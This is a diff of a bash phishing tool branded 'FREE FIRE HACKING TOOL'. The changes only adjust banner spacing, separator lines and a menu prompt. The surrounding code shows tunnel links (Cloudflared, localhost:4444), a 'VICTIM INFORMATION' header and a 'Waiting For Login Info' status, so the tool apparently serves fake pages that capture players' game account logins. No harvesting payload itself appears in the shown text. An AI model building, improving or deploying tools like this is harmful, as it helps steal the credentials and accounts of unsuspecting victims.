@@ -636,7 +636,7 @@ echo -e "\e[95m
 ⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁ \e[95;1m \e[0m\n"
   echo""    
   echo -e $'\e[1;33m\e[0m\e[1;31m            ██████████\e[0m'"\e[1;37m██████████"'\e[1;33m\e[0m\e[0;32m██████████\e[0m' '\e[1;32m\e[0m\e[1;33m \e[0m'  # Removed the "FREE FIRE PHISHING TOOL" part
-echo -e '\e[1;37m\e[0m           FREE FIRE HACKING TOOL'                                       
+echo -e '\e[1;37m\e[0m                FREE FIRE HACKING TOOL'                                       
   echo ""
    echo -e $'\e[1;33m\e[0m\e[1;33m        [\e[0m\e[1;32m Website :- \e[36mhttps://sandeeptech.com \e[0m\e[1;32m\e[0m\e[1;33m] \e[0m'
    echo ""
@@ -753,7 +753,7 @@ links_c() {
 }
 
 links_n() {
-                           echo -e "\e[96m=======================\e[92m   SANDEEP © 2025 FF  \e[96m=======================\e[92m"
+                           echo -e "\e[96m=================\e[92m   SANDEEP © 2025 FF  \e[96m=================\e[92m"
                            echo -e " "
 			   echo -e " "
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
@@ -763,14 +763,14 @@ links_n() {
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+			   echo -e "\e[96m=================\e[92m VICTIM INFORMATION \e[96m================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
 			   echo ""
 }
 
 links_l() {
-                           echo -e "\e[96m=======================\e[92m   SANDEEP © 2025 FF  \e[96m=======================\e[92m"
+                           echo -e "\e[96m=================\e[92m   SANDEEP © 2025 FF  \e[96m=================\e[92m"
                            echo -e " "
 			   echo -e " "
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m This Link Online Only 15 Minutes (\e[94mOnly Free User\e[1;95m) "
@@ -783,14 +783,14 @@ links_l() {
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+			   echo -e "\e[96m=================\e[92m VICTIM INFORMATION \e[96m================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
 			   echo ""
 }
 
 links_lhrlife() {
-                           echo -e "\e[96m=======================\e[92m   SANDEEP © 2025 FF  \e[96m=======================\e[92m"
+                           echo -e "\e[96m=================\e[92m   SANDEEP © 2025 FF  \e[96m=================\e[92m"
                            echo -e " "
 			   echo -e " "
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Notice :\e[94m You Open this link and click chack button\e[1;95m) "
@@ -803,14 +803,14 @@ links_lhrlife() {
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+			   echo -e "\e[96m=================\e[92m VICTIM INFORMATION \e[96m================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
 			   echo ""
 }
 
 all_links() {
-                           echo -e "\e[96m=======================\e[92m   SANDEEP © 2025 FF  \e[96m=======================\e[92m"
+                           echo -e "\e[96m=================\e[92m   SANDEEP © 2025 FF  \e[96m=================\e[92m"
                            echo -e " "
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                            printf "\e[1;33m\e[0m\e[1;33m Cloudflared :\e[0m\e[1;77m %s\e[0m\n" $clink                     
@@ -824,7 +824,7 @@ all_links() {
                            printf "\e[1;33m\e[0m\e[1;33m LocalHost Link :\e[0m\e[1;77m http://127.0.0.1:4444/   \e[0m "                     
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+			   echo -e "\e[96m=================\e[92m VICTIM INFORMATION \e[96m================= \e[93m" 
                            echo ""
 			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit... \e[93m"
 			   echo ""                
@@ -1074,7 +1074,7 @@ logo1
 logo_text
 echo ""
                  echo -e $''   
-                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
+                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m Choose Phishing Option  \e[1;91m  > : \e[0m' option
                  echo ""
 		 
 
